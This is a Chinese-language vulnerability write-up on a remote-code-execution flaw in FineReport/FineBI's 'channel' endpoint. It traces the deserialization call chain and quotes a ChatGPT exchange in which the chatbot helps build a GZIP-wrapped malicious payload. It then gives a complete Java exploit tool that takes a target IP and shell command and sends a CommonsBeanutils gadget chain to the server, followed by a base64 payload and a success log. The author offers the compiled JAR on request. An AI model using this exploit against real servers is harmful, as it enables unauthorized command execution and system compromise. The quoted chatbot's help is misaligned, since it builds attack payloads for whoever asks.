# 帆软 FineReport channel RCE

# 参考

[安全漏洞声明- FineReport帮助文档](https://help.fanruan.com/finereport/doc-view-4833.html)

[FineBI安装与启动- FineBI帮助文档 FineBI帮助文档 (fanruan.com)](https://help.fanruan.com/finebi/doc-view-260.html)

[帆软channel接口反序列化漏洞分析 - Yang_99的小窝 (yang99.top)](https://www.yang99.top/index.php/archives/93/)

[CommonsBeanutils与无commons-collections的Shiro反序列化利用 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html)

# 影响

2022-08-12 之前的 FineReport10.0/11.0、FineBI5.1 系列均受影響

#  复现环境

[FineBI V5.1.10](https://fine-build.oss-cn-shanghai.aliyuncs.com/finebi/5.1.5/stable_test/backup/2021-02-26/exe/spider/linux_unix_FineBI5_1-CN.sh)（自带 JRE java version "1.8.0_171"）

运行脚本安装，需要注意的是安装最大内存单位(M)，最低2048M。（虚拟机申请了6G的内存才可以安装）

```
./linux_unix_FineBI5_1-CN.sh
```

安装完成访问[页面](http://ip:37799/webroot/decision)继续初始化配置管理员账号密码，看到以下页面即说明环境配置完成。

![image-20230423155557397](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230423155557397.png)

# 分析

因为没有 PoC 目前官方的信息是：

> /webroot/decision/remote/design/channel 接口受影响

访问显示如下提示：

![image-20230423160256343](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230423160256343.png)

查一下相关字符串，看一下有哪些 JAR 文件提到了这个接口（输出经过过滤筛选）：

```bash
$ grep -rn "channel"
Binary file webapps/webroot/WEB-INF/lib/fine-bi-engine-third-5.1.jar matches
Binary file webapps/webroot/WEB-INF/lib/fine-core-10.0.jar matches
Binary file webapps/webroot/WEB-INF/lib/fine-third-10.0.jar matches
Binary file webapps/webroot/WEB-INF/lib/netty-all-4.1.17.Final.jar matches
Binary file webapps/webroot/WEB-INF/plugins/plugin-com.finebi.plugin.bi.hotback-1.0.5110/fr-plugin-bi-hotback-1.0.5110.jar matches
```

提取出所有的 JAR 准备来分析一下：

```bash
find ./ -name *.jar -exec cp {} /home/qax/Desktop/FineBI5.1_jar \;
```

分析之前发现 /bin/error.log 中有这个有关接口的信息。

```bash
$ cat error.log |grep "/remote/design/channel"
23/04/23 00:52:14 INFO RequestMappingHandlerMapping: Mapped "{[/remote/design/channel],methods=[POST],params=[],headers=[],consumes=[],produces=[],custom=[]}" onto public void com.fr.decision.extension.report.api.remote.RemoteDesignResource.onMessage(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse) throws java.lang.Exception
23/04/23 02:32:12 INFO RequestMappingHandlerMapping: Mapped "{[/remote/design/channel],methods=[POST],params=[],headers=[],consumes=[],produces=[],custom=[]}" onto public void com.fr.decision.extension.report.api.remote.RemoteDesignResource.onMessage(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse) throws java.lang.Exception
```

定位到了类 `com.fr.decision.extension.report.api.remote.RemoteDesignResource.onMessage`。IDEA 全局搜索一下这个类，在 fine-decision-report-10.0.jar 里面。

**com.fr.decision.extension.report.api.remote.RemoteDesignResource#onMessage**

```java
@RequestMapping(
    value = {"/channel"},
    method = {RequestMethod.POST}
)
@ResponseBody
public void onMessage(HttpServletRequest var1, HttpServletResponse var2) throws Exception {
    byte[] var3 = IOUtils.inputStream2Bytes(var1.getInputStream());
    var2.getOutputStream().write(WorkContext.handleMessage(var3));
}
```

步入` WorkContext.handleMessage(var3)`

```java
public static byte[] handleMessage(byte[] var0) {
    if (messageListener == null) {
        throw new RuntimeException("Invalid server.");
    } else {
        return messageListener.handleMessage(var0);
    }
}
```

步入 `messageListener.handleMessage(var0)`

```java
public byte[] handleMessage(byte[] var1) {
    FineResult var2 = new FineResult();
    try {
        Invocation var3 = null;
        try {
            var3 = this.deserializeInvocation(var1, var2);
        } catch (Exception var12) {
            return this.serializeResult(var2);
        }

        try {
            ......
        } catch (Throwable var13) {
            ......
        } finally {
            WorkspaceServerContext.resetConnection();
        }

        FineLoggerFactory.getLogger().debug("Workspace RPC done : {}", new Object[]{var3});
        return this.serializeResult(var2);
    } catch (Throwable var15) {
        FineLoggerFactory.getLogger().error(var15.getMessage(), var15);
        return new byte[0];
    }
}
```

步入 `this.deserializeInvocation(var1, var2)`

```java
private Invocation deserializeInvocation(byte[] var1, FineResult var2) throws Exception {
    try {
        return (Invocation) SerializerHelper.deserialize(var1,GZipSerializerWrapper.wrap(InvocationSerializer.getDefault()));
    } catch (Exception var4) {
        var2.setResult((Object) null);
        var2.setException(var4);
        throw var4;
    }
}
```



继续步入 `deserialize()`，这里需要注意的是 `var2` 才是一开始传入的数据，`var1` 是之前的 `GZipSerializerWrapper.wrap(InvocationSerializer.getDefault())`。（`var2` 是用 `ByteArrayInputStream` 封装了一次的）

```java
public static <T> T deserialize(byte[] var0, Serializer<T> var1) throws Exception {
	if (var1 == null) {
		var1 = SerializerSummaryAdaptor.get();
	}

	ByteArrayInputStream var2 = new ByteArrayInputStream(var0);
	return var1.deserialize(var2);
}
```

步入 `var1.deserialize(var2)`，直接步入到一个接口

```java
public interface Serializer<T> {
    void serialize(T var1, OutputStream var2) throws Exception;

    T deserialize(InputStream var1) throws Exception;
}
```

实现接口的有以下几个类，之前讲过是 `var1` 是 `GZipSerializerWrapper.wrap()` 返回的对象，就是 `GZipSerializerWrapper` 对象。

```java
public static <T> Serializer<T> wrap(Serializer<T> var0) {
    return new GZipSerializerWrapper(var0);
}

private GZipSerializerWrapper(Serializer<T> var1) {
	assert var1 != null;
	this.serializer = var1;// var1 = InvocationSerializer.getDefault()
}
```

也就是说步入 `var1.deserialize(var2)` 到 `com.fr.serialization.GZipSerializerWrapper#serialize`：（这里 `var1` 又被包装一次）

```java
public T deserialize(InputStream var1) throws Exception {
	GZIPInputStream var2 = new GZIPInputStream(var1);
    return this.serializer.deserialize(var2);
}
```

步入到哪里要看 `this.serializer` 是什么，现在看看 `this.serializer` 。之前知道是 `InvocationSerializer.getDefault()`，返回的是 `new InvocationSerializer()`。也就是说 `this.serializer.deserialize(var2)` 是 `InvocationSerializer.deserialize(var2)`。

**com.fr.rpc.serialization.InvocationSerializer#deserialize**

```java
public Invocation deserialize(InputStream var1) throws Exception {
        CustomObjectInputStream var2 = new CustomObjectInputStream(var1);
        InvocationSerializer.InvocationPack var3 = (InvocationSerializer.InvocationPack)var2.readObject();
        Map var4 = (Map)var2.readObject();
        Invocation var5 = var3.toInvocation(this.readParams(var3.params));
        var5.getMetadata().putAll(var4);
        return var5;
    }
```

`CustomObjectInputStream` 包装一次 `var2` 之后，可以看到代码里面有两个 `var2.readObject()`。

## 数据流向

`var` 的流向大概就是以下流程：

```
请求体的字节表示：	byte[] var0
包装1：			ByteArrayInputStream var1 = new ByteArrayInputStream(var0);
包装2：			GZIPInputStream var2 = new GZIPInputStream(var1)
包装3：			CustomObjectInputStream var3 = new CustomObjectInputStream(var2)

反序列化：		   (Map)var3.readObject()

说明：
CustomObjectInputStream() 相当于 ObjectInputStream() 
```

## 构造 PoC

使用 CB 链去构造 Payload。

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "calc" |base64
```

## Prompt

Je：有一个应用函数如下，当我们可以控制函数入参var0时，如何构造var0，会导致readObject()反序列化命令执行？

```
private static void Env(InputStream var0) throws IOException, ClassNotFoundException {
    GZIPInputStream var2 = new GZIPInputStream(var0);
    JDKSerializer.CustomObjectInputStream var3 = new JDKSerializer.CustomObjectInputStream(var2);
    Map map = (Map) var3.readObject();
}
```

GPT：根据给出的代码，我们可以看到该函数接收一个`InputStream`对象作为参数，并在该输入流上执行反序列化操作，将字节流转换成Java对象。具体来说，该函数会将输入流先解压缩，然后再使用`ObjectInputStream`的`readObject()`方法进行反序列化，得到一个`Map`对象。

因此，为了构造一个可以执行任意命令的入参`var0`，需要构造一个包含了恶意代码的序列化后的字节数组，并将该字节数组封装成一个输入流对象作为`var0`参数传入该函数中。

一种常见的方式是使用Java反序列化漏洞利用工具，例如ysoserial或者marshalsec，生成一个包含了恶意代码的序列化对象，并将其序列化成字节数组。然后使用`ByteArrayInputStream`类将字节数组封装成一个输入流对象，并将该输入流对象作为`var0`参数传入该函数中，从而执行反序列化操作并触发恶意代码的执行。

需要注意的是，由于反序列化漏洞具有高危性和难以发现的特点，应用程序中应尽量避免使用反序列化操作，或者对反序列化输入进行严格的校验和过滤，以防止攻击者利用该漏洞进行恶意攻击。

Je：按照你说的做会报错

```
java.util.zip.ZipException: Not in GZIP format
	at java.util.zip.GZIPInputStream.readHeader(GZIPInputStream.java:165)
	at java.util.zip.GZIPInputStream.<init>(GZIPInputStream.java:79)
	at java.util.zip.GZIPInputStream.<init>(GZIPInputStream.java:91)
	at Test.Env(Test.java:30)
	at Test.main(Test.java:25)
```

GPT：
非常抱歉，我的回答有误。

根据报错信息 `java.util.zip.ZipException: Not in GZIP format`，很可能是因为输入流的前两个字节不是GZIP格式的魔数 `0x8b1f`，导致`GZIPInputStream`类无法正确解析输入流。

因此，如果要构造一个可以执行任意命令的入参`var0`，需要构造一个符合GZIP格式的字节数组，并将该字节数组封装成一个输入流对象作为`var0`参数传入该函数中。

以下是一个示例代码，构造一个包含恶意代码的GZIP格式的输入流：

```java
// 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组
byte[] maliciousBytes = ...;

// 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中
ByteArrayOutputStream baos = new ByteArrayOutputStream();
GZIPOutputStream gzipOutputStream = new GZIPOutputStream(baos);
gzipOutputStream.write(maliciousBytes);
gzipOutputStream.finish();
byte[] gzipBytes = baos.toByteArray();

// 将GZIP格式的字节数组封装成一个输入流对象，并作为var0参数传入Env函数中
InputStream var0 = new ByteArrayInputStream(gzipBytes);
Env(var0);
```

在上述代码中，首先使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组`maliciousBytes`。接着，使用`ByteArrayOutputStream`类和`GZIPOutputStream`类构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中。最后，将GZIP格式的字节数组封装成一个输入流对象`var0`，作为参数传入`Env`函数中，从而执行反序列化操作并触发恶意代码的执行。

需要注意的是，由于反序列化漏洞具有高危性和难以发现的特点，应用程序中应尽量避免使用反序列化操作，或者对反序列化输入进行严格的校验和过滤，以防止攻击者利用该漏洞进行恶意攻击。

## Payload

最终得到 Payload 如下（包含测试环境）：

```java
import com.fr.serialization.JDKSerializer;

import java.io.*;
import java.util.Base64;
import java.util.Map;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

public class Test {
    public static void main(String[] args) {
        try {
            String base64String = getBase64();
            byte[] bytes = Base64.getDecoder().decode(base64String);

            // 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组
            byte[] maliciousBytes = bytes;

            // 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(baos);
            gzipOutputStream.write(maliciousBytes);
            gzipOutputStream.finish();
            byte[] gzipBytes = baos.toByteArray();

            // 将GZIP格式的字节数组封装成一个输入流对象，并作为var0参数传入Env函数中
            InputStream var0 = new ByteArrayInputStream(gzipBytes);
            Env(var0);

        }catch (Exception e){e.printStackTrace();}


    }

    private static void Env(InputStream var0) throws IOException, ClassNotFoundException {
        GZIPInputStream var2 = new GZIPInputStream(var0);
        JDKSerializer.CustomObjectInputStream var3 = new JDKSerializer.CustomObjectInputStream(var2);
        Map map = (Map) var3.readObject();
    }

    private static String getBase64() {
        return "";
    }
}

```

## 排查报错

报错如下

```
java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962
```

在这里 Payload 应该是没有问题了，问题应该是在 CB 的版本上，但是为了确认是不是这个原因，先把依赖的 fine-bi-engine-third-5.1.jar 使用压缩文件删除掉了内置的 CB，然后导入新的对应 YSO 的 commons-beanutils-1.9.2.jar。运行之后弹出计算器，目前证明 Payload 是没有问题的。

![image-20230427183016302](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230427183016302.png)

# 武器化

使用 p牛 的简化的 CB1 代码构造一个 Payload 之前，目前的思路就是把 YSO 生成的 Payload 使用的 jar 换成 FineBI5.1 的fine-bi-engine-third-5.1.jar，重新生成 Payload 即可。

![image-20230428101800641](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230428101800641.png)

同样的，fine-bi-engine-third-5.1.jar 的 CB1 是没有问题的。

武器化代码：

**CommonsBeanutils1.java**

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.PriorityQueue;
import java.util.zip.GZIPOutputStream;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

public class CommonsBeanutils1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // init parameters
        String[] params = processCommandArgs(args);
        String targetIP = params[0];
        String cmd = params[1];
        System.out.println("[+] Target IP: " + targetIP);
        System.out.println("[+] Command: " + cmd);

        TemplatesImpl obj = new TemplatesImpl();

        // 类的静态初始化器中插入一段 Runtime 代码，以在运行时执行指定的命令
        String exec_cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                cmd.replace("\\", "\\\\").replace("\"", "\\\"") +
                "\");";
        final CtClass clazz = ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName());
        clazz.makeClassInitializer().insertAfter(exec_cmd);
        setFieldValue(obj, "_bytecodes", new byte[][]{
//                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
                clazz.toBytecode()

        });
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);

        // 将 PriorityQueue 对象序列化为字节数组
        oos.writeObject(queue);
        oos.close();

        // 反序列化 ByteArray
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        Object o = (Object)ois.readObject();

//         Base64 Payload
        String base64Encoded = Base64.getEncoder().encodeToString(genPayload(barr.toByteArray()));
        System.out.println("[+] Base64 Payload: " + base64Encoded);

        sendPayload(genPayload(barr.toByteArray()),targetIP);
    }

    private static void sendPayload(byte[] data,String targetIP) {
        try {
            String urlString = "http://" + targetIP + ":37799/webroot/decision/remote/design/channel";
            System.out.println("[+] Target URL: " + urlString);
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("Content-Length", String.valueOf(data.length));

            try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
                dos.write(data);
            }

            int responseCode = conn.getResponseCode();
            System.out.println("[+] Response code: " + responseCode);
            System.out.println("[+] Success !!!");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // 逆封装 Payload，根据
    private static byte[] genPayload(byte[] bytes) throws IOException {
        // 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组
        byte[] maliciousBytes = bytes;

        // 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        GZIPOutputStream gzipOutputStream = new GZIPOutputStream(baos);
        gzipOutputStream.write(maliciousBytes);
        gzipOutputStream.finish();
        byte[] gzipBytes = baos.toByteArray();
        return gzipBytes;
    }

    // 反序列化 poc.ser
    private static void readObjectFile() throws IOException, ClassNotFoundException {
        readObjectFile();
        // create a FileInputStream for the file to be read
        FileInputStream fileIn = new FileInputStream("poc.ser");

        // create an ObjectInputStream for the FileInputStream
        ObjectInputStream in = new ObjectInputStream(fileIn);

        // read the object from the ObjectInputStream
        in.readObject();

        // close the ObjectInputStream and FileInputStream
        in.close();
        fileIn.close();
    }

    public static String[] processCommandArgs(String[] args) {

        String target = null;
        String cmd = null;

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "-t":
                case "--target":
                    target = args[++i];
                    break;
                case "-c":
                case "--cmd":
                    cmd = args[++i];
                    break;
                default:
                    System.err.println("[-] Unknown option: " + args[i]);
                    System.err.println("[+] Usage: java CommandLineArgsExample -t|--target <ip> -c|--cmd <command>");
                    System.exit(1);
            }
        }

        if (target == null || cmd == null) {
            System.err.println("[+] Usage: java CommandLineArgsExample -t|--target <ip> -c|--cmd <command>");
            System.exit(1);
        }

        // Return target and cmd parameters as a String array
        return new String[] { target, cmd };
    }
}
```

**EvilTemplatesImpl.java**

```java
package evil;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public EvilTemplatesImpl() throws Exception {
        super();
        System.out.println("Hello TemplatesImpl");
//        Runtime.getRuntime().exec("touch /tmp/success_xyw_04");
    }
}
```

使用：

```cmd
> java -jar .\FineReport_channel_RCE.jar
[+] Usage: java CommandLineArgsExample -t|--target <ip> -c|--cmd <command>

> java -jar .\FineReport_channel_RCE.jar -t 192.168.47.130 -c "touch /tmp/success_FineReport_RCE"
[+] Target IP: 192.168.47.130
[+] Command: touch /tmp/success_FineReport_RCE
[+] Base64 Payload: H4sIAAAAAAAAAK1Vz28bRRT+xnZsxzi/XJK0/EygpUlKdwttKa0jQpKmqoXTliRKD0ayJpvBWdhf7M62Gw499A/gxIV/AA7kEoRK1QMS1156hwv/AAcEB6SKwtvZTWwTS7RQK9rMvJn3fW++9+bNzi/oC3yMf8RvcC2UpqVd803XN+X2+6EIxec/nvr24dzt3SwyNeQC81NRR8lwbY/7
XLq+xFg99tRjT31x316NPAAZAj7h+i2Ne9zYEhr52a4TaBuCO7FDoC3QqO314DN2+9GVX29lkOli+QS3wOooer7rCV9uS1QSVos7LX1V+qbTIkZim+vBZriWJQxpJuM9zEBLeTcs0Y7g4e9fHLvr7J7LAJEnMeyG0gvltYTXFMHNHB0rS0QXCEkLQkfrIIw4xaOZjhS+wy0tCixpaNLnkbYmbM/iUgQ1+t9//eoP
zs7Xp7PI1zDQNJ1N4cgrob0h/BoGm+TgBJaQNbJHDZSaG9tSGO6mCCSyjcZCA/mmYfGAppVGhwyLsa1aR1/T4baIJcvVMdL85wm6M9a2JxnDX/QLfUX03p9HRlutnxItaImRPdNY2Plt/I98ce3n1Jz/4P6je9/T8hnMlpDHS/14GRNFTJbwCl4t4GgBxxj61ak+dH2bwZ+qk3g6iaeTeHoinq7E0/fE05V4+sWr
y9VGz9221d4bCN/kFpWmr6+mQx6n+zJ3Ni3hV6fXGXKLpCDDUN10RKL1Wpx5RpXkGtxa5+RH89SYk1tmwHC4Lm6QSEv06cpglaG46RqhTYljOPlExyHXrSQuIlj4/4djKC1FhvBUfRfwGsOXT6bvv0awKW394tryfGQGNTKp6/1UclI0UziGs/8pCoZCqiXD/FNQMj9rOqZ8hyE7Nb1ewHHSdtUNfUNcMuOqGDtQ
CFp8k8o4gucKmCpjGjMMhy4Ly3InuvYVcKKM13GSMHpXFMO7j5szP3SkaQt9fiOgS2XItbRfMJx/XIg9l/3CoajbjaTDOtzRZbcDKej2ZqmhMIwmPcR0qYMQOLVgwe3qHky3mbLkxTOLAEenDjZuVQqzhpVqP9LesJIctQCdMtESMp3HMNP1A9uqZbyBN0s4hdMMk9INja0JXdoeSWIYIgial+jurwiPXq3myuJS
EWfpootIGAzHe4XVYaI2GSMQwzm8HTOcZxhYldz4eJl7qmdgEn3U/eJfDnRiFJFBP83m4gcj7p678YOIEn3ztAE0eoa+E8kiyhhQzgyDGFLrpD5GyKOSQh5SsM+msDVl7QFbVrAzyWJP2FGMkUc8Gsdhou8koErejzuj9g/MfAf2DTKV7B3k2mSDKu4hchwmkooiLScOKeke7PMkhUawTMEeJb+YfOgrZFn9Ls5U
3rqDC9d3VTxVpRWjP7ygmF6kN7ii7lPXbfFuMkTxCzcQ/Q0HdAVKvwgAAA==
[+] Target URL: http://192.168.47.130:37799/webroot/decision/remote/design/channel
[+] Response code: 200
[+] Success !!!
```

如果你有研究需求需要 JAR 文件，请通过邮箱联系我获取。




